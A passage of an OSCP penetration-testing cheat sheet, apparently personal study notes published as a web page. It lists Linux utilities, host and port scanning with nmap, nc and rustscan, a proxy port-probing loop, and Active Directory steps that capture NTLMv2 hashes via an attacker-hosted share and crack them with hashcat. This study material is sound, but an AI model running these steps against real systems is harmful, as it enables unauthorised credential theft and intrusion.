    <span class="md-ellipsis">
      WMI (port 135)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#winrm-5985-5986" class="md-nav__link">
    <span class="md-ellipsis">
      WinRM (5985, 5986)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec-smb" class="md-nav__link">
    <span class="md-ellipsis">
      PsExec (SMB)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Pass The Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overpass-the-hash-request-tgttgs-using-hash" class="md-nav__link">
    <span class="md-ellipsis">
      OverPass The Hash - Request TGT/TGS using Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Pass The Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rdp-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      RDP Hijacking
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence" class="md-nav__link">
    <span class="md-ellipsis">
      Persistence
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Golden Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shadow-copies" class="md-nav__link">
    <span class="md-ellipsis">
      Shadow Copies
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#more_2" class="md-nav__link">
    <span class="md-ellipsis">
      More
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#meterpreter-be-cautious-to-use-only-one-1-machine" class="md-nav__link">
    <span class="md-ellipsis">
      Meterpreter (Be Cautious to Use only one 1 Machine)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Important payloads
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws" class="md-nav__link">
    <span class="md-ellipsis">
      ☁AWS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="☁AWS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-recon" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Recon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-specific" class="md-nav__link">
    <span class="md-ellipsis">
      Service Specific
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Service Specific">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#s3-bucket" class="md-nav__link">
    <span class="md-ellipsis">
      S3 bucket
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration-thru-api" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration thru API
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumeration thru API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identify-the-aws-account-id-from-a-public-s3-bucket" class="md-nav__link">
    <span class="md-ellipsis">
      Identify the AWS Account ID from a Public S3 Bucket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#to-filter-search" class="md-nav__link">
    <span class="md-ellipsis">
      To filter &amp; search
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  
    
      
    
    <a href="https://github.com/pakcyberbot/OSCP-Notes-and-Environment/raw/master/docs/10_Commands_Quick_Reference.md" title="View source of this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
    </a>
  


<h1 id="oscp-commands-quick-reference">⌨️ OSCP Commands - Quick Reference</h1>
<p>I used this cheat sheet inside Obsidian due to its powerful customization options. You can see how it looks in Obsidian in the GIF below.</p>
<div align="center">
    <img src="https://pakcyberbot.com/OSCP-Notes-and-Environment/assets/obsidian.gif">
</div>

<p>You can also download the Markdown file and use it in your own Obsidian setup. I’ll be publishing my full Obsidian vault with all configurations soon, so follow me to stay updated.</p>
<h3 id="tool-docs">Tool Docs</h3>
<ul>
<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/">PowerView Docs</a></li>
<li>
<p><a href="https://www.netexec.wiki/">Netexec Docs</a></p>
</li>
<li>
<p>https://github.com/dollarboysushil/oscp-cpts-notes</p>
</li>
<li>https://github.com/0xsyr0/oscp</li>
</ul>
<h2 id="attacker-machine-commands">Attacker Machine Commands</h2>
<h3 id="general-linux-commands">General Linux Commands</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># to create list of IPs for TARGETS.txt</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%s\n&quot;</span><span class="w"> </span><span class="m">192</span>.168.0.<span class="o">{{</span><span class="m">1</span>..5<span class="o">}</span>,8<span class="o">}</span><span class="w"> </span>&gt;<span class="w"> </span>TARGETS.txt
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>sed<span class="w"> </span><span class="s1">&#39;/^1/d&#39;</span><span class="w"> </span>file.txt<span class="w"> </span><span class="c1"># for deleting all the lines that start with 1</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>sudo<span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;1i ip hostname&#39;</span><span class="w"> </span>/etc/hosts<span class="w">  </span><span class="c1"># 1st line to insert/add</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>sudo<span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;1d&#39;</span><span class="w"> </span>/etc/hosts<span class="w">  </span><span class="c1"># 1st line to delete/remove</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># to use DC as a DNS Server for our Kali for only specific AD specific domains</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>sudo<span class="w"> </span>vim<span class="w"> </span>/etc/dnsmasq.conf
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>sudo<span class="w"> </span>vim<span class="w"> </span>/etc/resolv.conf
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="c1"># add 127.0.0.1 as nameserver so we use dnsmasq</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>sudo<span class="w"> </span>systemctl<span class="w"> </span>restart<span class="w"> </span>dnsmasq
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="c1"># UV command, to isolate python prog req dependencies</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>uv<span class="w"> </span>add<span class="w"> </span>--script<span class="w"> </span>&lt;tool-python-name&gt;<span class="w"> </span>-r<span class="w"> </span>requirements.txt
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>uv<span class="w"> </span>run<span class="w"> </span>&lt;program-name&gt;
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="c1"># to quickly run those programs add the below shebang</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="c1">#!/usr/bin/env -S uv run --script</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;1i #!/usr/bin/env -S uv run --script&#39;</span><span class="w"> </span>script.py
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39; &#39;</span>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>sed<span class="w"> </span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>paste<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="w"> </span>username<span class="w"> </span>passwords<span class="w">  </span><span class="c1"># to combine in columns</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>awk<span class="w"> </span><span class="s1">&#39;{print $5}&#39;</span><span class="w"> </span>file.txt<span class="w"> </span><span class="c1"># to effectively get the columns 5 data</span>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="c1"># for quick parsing of json files</span>
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>jq<span class="w"> </span><span class="s1">&#39;.computers[].Name&#39;</span><span class="w">  </span>jsonfile.json
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>jq<span class="w"> </span><span class="s1">&#39;.computers[] | {Name,field2}&#39;</span><span class="w">  </span>jsonfile.json
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="s1">&#39;select(.label | test(&quot;MANAGEMENT&quot;))&#39;</span><span class="w"> </span><span class="c1"># search for specific entry on specfiic condition</span>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="s1">&#39;select(.Properties.AdminCount == 1)&#39;</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>cat<span class="w"> </span>domain_users.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w">  </span>-r<span class="w"> </span><span class="s1">&#39;.[].attributes.sAMAccountName[]&#39;</span><span class="w">  </span><span class="c1"># -r for not showing double quotes</span>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="c1"># to take specific ip scan from the All_IPs_Nmap Scan</span>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/scan report.*244/,/Nmap scan report/p&#39;</span><span class="w">  </span>all_Nmap_output<span class="w"> </span><span class="p">|</span><span class="w"> </span>xclip<span class="w"> </span>-selection<span class="w"> </span>clipboard
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>binwalk<span class="w"> </span>-Me<span class="w"> </span>image.png
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>exiftool<span class="w"> </span>-u<span class="w"> </span>-a<span class="w"> </span>&lt;image/file&gt;
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>file<span class="w"> </span>&lt;file&gt;
</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>
</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>
</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>grep<span class="w"> </span>-irl<span class="w"> </span><span class="s1">&#39;patter&#39;</span><span class="w"> </span>.
</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>grep<span class="w"> </span>-irn<span class="w"> </span><span class="s1">&#39;patter&#39;</span><span class="w"> </span>.
</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>
</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>
</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>sudo<span class="w"> </span>update-alternatives<span class="w"> </span>--install<span class="w"> </span>/usr/bin/python<span class="w"> </span>python<span class="w"> </span><span class="se">\</span>
</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>/usr/bin/python3.5<span class="w"> </span><span class="m">3</span>
</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>
</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>
</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="c1"># in case can&#39;t open interactive editor inside the revshell</span>
</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>cat<span class="w"> </span><span class="s">&lt;&lt;&#39;EOT&#39;&gt; /anyfile</span>
</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="s">content</span>
</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="s">EOT</span>
</span></code></pre></div>
<h3 id="general-enumeration">General Enumeration</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Enumeration</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>autorecon<span class="w"> </span>-t<span class="w"> </span>Targets.txt
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># live host scanning </span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>nc<span class="w"> </span>-zv<span class="w"> </span>-w<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">172</span>.16.50.<span class="nv">$i</span><span class="w"> </span><span class="m">445</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>nmap<span class="w"> </span>-sn<span class="w"> </span>-iL<span class="w"> </span>TARGETS.txt
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.0.1-254<span class="w"> </span><span class="c1"># ping sweep</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">192</span>.168.50.1-253<span class="w"> </span>-oG<span class="w"> </span>web-sweep.txt<span class="w"> </span><span class="c1"># host scan can be done through this</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c1"># Port Scanning</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>nc<span class="w"> </span>-nv<span class="w"> </span>-w<span class="w"> </span><span class="m">1</span><span class="w"> </span>-z<span class="w"> </span><span class="m">192</span>.168.10.1<span class="w"> </span><span class="m">1</span>-1000<span class="w"> </span><span class="c1"># tcp scan, shows timeout or open ports extra v -nvv for every output</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>nc<span class="w"> </span>-nv<span class="w"> </span>-u<span class="w"> </span>-z<span class="w"> </span>-w<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">192</span>.168.50.149<span class="w"> </span><span class="m">120</span>-123<span class="w"> </span><span class="c1"># for udp scan, returns the service name. Has to be run mutliple times</span>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="k">while</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>port<span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">    </span><span class="nv">test_url</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">base_url</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">port</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">    </span><span class="nv">response</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-skL<span class="w"> </span>--proxy<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$proxy_url</span><span class="s2">&quot;</span><span class="w"> </span>--max-time<span class="w"> </span><span class="m">5</span><span class="w"> </span>--connect-timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$test_url</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span>
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span>!<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$response</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">&quot;ERROR&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] </span><span class="nv">$test_url</span><span class="s2"> may be open behind the proxy&quot;</span>
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="w">    </span><span class="k">else</span>
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[-] </span><span class="nv">$test_url</span><span class="s2"> seems closed or filtered&quot;</span>
</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="w">    </span><span class="k">fi</span>
</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="k">done</span><span class="w"> </span>&lt;<span class="w"> </span>top_ports.txt
</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>
</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>
</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>nmap<span class="w"> </span>-sT<span class="w"> </span>&lt;ip&gt;<span class="w"> </span><span class="c1"># this will be helpful when dealing with certain kind of proxies in between the target</span>
</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-sS<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>
</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>sudo<span class="w"> </span>nmap<span class="w"> </span><span class="nv">$IP</span><span class="w"> </span>-sU<span class="w"> </span>--max-rtt-timeout<span class="w"> </span>100ms<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--open<span class="w"> </span>-T4<span class="w"> </span>-oA<span class="w"> </span>udpscan.txt
</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>nmap<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>ip<span class="w">  </span><span class="c1"># incase of unstable network</span>
</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>rustscan<span class="w"> </span>-a<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>--range<span class="w"> </span><span class="m">1</span>-65535<span class="w"> </span>--<span class="w"> </span>-A<span class="w"> </span>-Pn<span class="w">  </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>portscan1.txt<span class="w"> </span><span class="c1"># prefered</span>
</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>
</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="c1"># List of top ports </span>
</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>cat<span class="w"> </span>/usr/share/nmap/nmap-services<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^#&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-k3<span class="w"> </span>-nr<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">100</span>
</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>cat<span class="w"> </span>/usr/share/nmap/nmap-services<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^#&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-k3<span class="w"> </span>-nr<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">100</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{split($2, a, &quot;/&quot;); print a[1]}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>top_ports.txt
</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>
</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>
</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>
</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="c1"># specific to AD</span>
</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>nxc<span class="w"> </span>smb<span class="w"> </span>ip<span class="w"> </span><span class="c1"># to quickly look for domain nam</span>
</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>nmap<span class="w"> </span>-script<span class="w"> </span>dns-srv-enum<span class="w"> </span>--script-args<span class="w"> </span><span class="s2">&quot;dns-srv-enum.domain=&#39;domainname&#39;&quot;</span>
</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>
</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-A<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span><span class="c1"># must use this, only allowed in analyze mode not poisoning</span>
</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="c1"># and capture NTLMv2 hashes like typing `dir \\attacker-ip\nonshare` </span>
</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>&lt;<span class="nb">hash</span><span class="w"> </span>file&gt;<span class="w"> </span>&lt;password<span class="w"> </span>file&gt;<span class="w"> </span>--force
</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>
</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>
</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="c1"># firewall check</span>
</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>If<span class="w"> </span>a<span class="w"> </span>firewall<span class="w"> </span>is<span class="w"> </span><span class="k">in</span><span class="w"> </span>place,<span class="w"> </span>an<span class="w"> </span>ACK<span class="w"> </span>scan<span class="w"> </span><span class="o">(</span><span class="sb">`</span>nmap<span class="w"> </span>-sA<span class="sb">`</span><span class="o">)</span><span class="w"> </span>shows:<span class="w">  </span>
</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="sb">`</span>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">994</span><span class="w"> </span>filtered<span class="w"> </span>ports<span class="sb">`</span>
</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>
</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>If<span class="w"> </span>no<span class="w"> </span>firewall<span class="w"> </span>is<span class="w"> </span>present,<span class="w"> </span>the<span class="w"> </span>output<span class="w"> </span>shows:<span class="w">  </span>
